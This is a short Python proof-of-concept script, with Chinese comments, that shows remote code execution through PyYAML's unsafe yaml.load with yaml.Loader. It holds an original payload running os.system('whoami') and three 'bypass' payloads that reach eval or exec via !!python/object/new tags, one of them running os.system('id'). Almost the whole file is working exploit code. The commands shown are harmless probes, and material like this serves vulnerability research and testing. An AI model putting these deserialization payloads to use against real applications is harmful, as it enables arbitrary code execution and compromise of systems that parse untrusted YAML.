import yaml

def banner():
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

print(yaml.__version__) # 6.0.2
# original payload
exp = "!!python/object/new:os.system [\"whoami\"]"
yaml.load(exp, yaml.Loader)
banner()
# bypass payloads
payload1 = """
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ print('payload1! 漏洞存在'),__import__('os').system('id') ]
"""
yaml.load(payload1, yaml.Loader)
banner()
payload2 = """
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "print('payload2! 漏洞存在')"
"""
yaml.load(payload2, yaml.Loader)
# 创建一个名为 "z" 的新类
z = type("z", (), {"extend": exec})
# 给 "z" 类添加一个 listitems 属性
setattr(z, "listitems", "print('漏洞存在')")
# 现在我们可以访问这个类的 extend 方法和 listitems 属性
print(z.listitems)  # 输出: print('漏洞存在')
# 调用 extend 方法，也就是 exec 函数
z.extend(z.listitems)  # 执行: print('漏洞存在')

banner()
payload3 = """
- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "print('payload3! 漏洞存在');"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
"""
yaml.load(payload3, yaml.Loader)

# exec("import os;x = os.system;x(\"id\")")
